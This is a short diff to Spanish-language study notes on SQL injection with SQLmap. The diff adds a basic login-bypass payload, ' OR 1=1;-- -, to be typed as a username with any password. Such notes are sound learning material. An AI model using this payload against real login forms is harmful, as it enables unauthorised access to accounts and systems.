@@ -1,3 +1,9 @@
+SQLI básica:
+
+```login
+' OR 1=1;-- -              #username
+<cualquier contraseña>     #password 
+```
 # Inyecciones SQL con SQLmap
 
 SQLmap automatiza la deteccion y explotacion de inyecciones SQL.
